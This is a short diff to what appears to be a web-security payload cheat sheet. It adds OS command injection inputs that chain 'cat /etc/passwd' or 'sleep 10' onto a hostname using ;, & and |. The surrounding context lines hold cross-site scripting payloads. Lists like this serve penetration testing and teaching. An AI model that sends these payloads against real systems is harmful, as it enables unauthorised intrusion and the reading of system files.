@@ -49,6 +49,18 @@ ParamUrl=robots.txt" onload="alert(1)
 ParamHeight="></iframe><script>alert(1);</script>
 ```
 
+### OS Command Injection
+```
+www.nsa.gov; cat /etc/passwd
+www.nsa.gov & cat /etc/passwd
+www.nsa.gov | cat /etc/passwd
+```
+
+### OS Command Injection - Blind
+```
+www.nsa.gov | sleep 10
+```
+
 ### PHP Code Injection
 
 ```
